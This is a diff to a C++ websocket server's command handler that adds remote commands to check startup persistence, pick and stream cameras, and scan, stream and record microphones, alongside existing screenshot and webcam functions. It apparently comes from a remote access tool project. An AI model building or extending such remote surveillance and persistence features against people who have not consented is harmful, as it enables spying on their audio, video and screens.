@@ -111,6 +111,13 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
                 j_res["type"] = "ACTION_RESULT";
             }
 
+            else if (cmd == "CHECK_PERSISTENCE") {
+                bool isEnabled = CheckStartupExists();
+                j_res["enabled"] = isEnabled;
+                j_res["msg"] = isEnabled ? "Persistence is ENABLED" : "Persistence is DISABLED";
+                j_res["type"] = "PERSISTENCE_STATUS";
+            }
+
             // =============================================================
             // 2.5. NHÓM LỆNH: SERVER INFO
             // =============================================================
@@ -173,13 +180,19 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
                 j_res["data"] = base64Img;
                 j_res["type"] = "SCREENSHOT_RESULT";
             }
+            else if (cmd == "SCAN_CAMERAS") {
+                std::string cameraList = ScanAvailableCameras();
+                j_res["data"] = json::parse(cameraList);
+                j_res["type"] = "CAMERA_LIST";
+            }
             else if (cmd == "START_CAM") {
                 if (g_IsStreaming) {
                     j_res["msg"] = "Webcam is running";
                 }
                 else {
-                    StartWebcamStream(s, hdl);
-                    j_res["msg"] = "Webcam Started";
+                    int camIndex = j_req.contains("cameraIndex") ? j_req["cameraIndex"].get<int>() : 0;
+                    StartWebcamStream(s, hdl, camIndex);
+                    j_res["msg"] = "Webcam Started (Camera " + std::to_string(camIndex) + ")";
                 }
                 j_res["type"] = "ACTION_RESULT";
             }
@@ -198,8 +211,46 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
                 }
                 else {
                     int duration = j_req.contains("duration") ? j_req["duration"].get<int>() : 10;
-                    StartRecordVideo(s, hdl, duration);
-                    j_res["msg"] = "Dang khoi dong camera de ghi hinh...";
+                    int camIndex = j_req.contains("cameraIndex") ? j_req["cameraIndex"].get<int>() : 0;
+                    StartRecordVideo(s, hdl, duration, camIndex);
+                    j_res["msg"] = "Dang khoi dong camera de ghi hinh... (Camera " + std::to_string(camIndex) + ")";
+                }
+                j_res["type"] = "ACTION_RESULT";
+            }
+
+            // =============================================================
+            // 4.5. NHÓM LỆNH: MICROPHONE
+            // =============================================================
+            else if (cmd == "SCAN_MICS") {
+                std::string micList = ScanAvailableMicrophones();
+                j_res["data"] = json::parse(micList);
+                j_res["type"] = "MIC_LIST";
+            }
+            else if (cmd == "START_MIC") {
+                if (g_IsStreamingAudio) {
+                    j_res["msg"] = "Microphone is already running";
+                }
+                else {
+                    int micIndex = j_req.contains("micIndex") ? j_req["micIndex"].get<int>() : 0;
+                    StartMicStream(s, hdl, micIndex);
+                    j_res["msg"] = "Microphone Started (Mic " + std::to_string(micIndex) + ")";
+                }
+                j_res["type"] = "ACTION_RESULT";
+            }
+            else if (cmd == "STOP_MIC") {
+                StopMicStream();
+                j_res["msg"] = "Microphone stopped";
+                j_res["type"] = "ACTION_RESULT";
+            }
+            else if (cmd == "RECORD_MIC") {
+                if (g_IsStreamingAudio) {
+                    j_res["msg"] = "Error: Stop live audio first!";
+                }
+                else {
+                    int duration = j_req.contains("duration") ? j_req["duration"].get<int>() : 10;
+                    int micIndex = j_req.contains("micIndex") ? j_req["micIndex"].get<int>() : 0;
+                    RecordMicAudio(s, hdl, duration, micIndex);
+                    j_res["msg"] = "Recording audio from Mic " + std::to_string(micIndex) + " for " + std::to_string(duration) + "s...";
                 }
                 j_res["type"] = "ACTION_RESULT";
             }
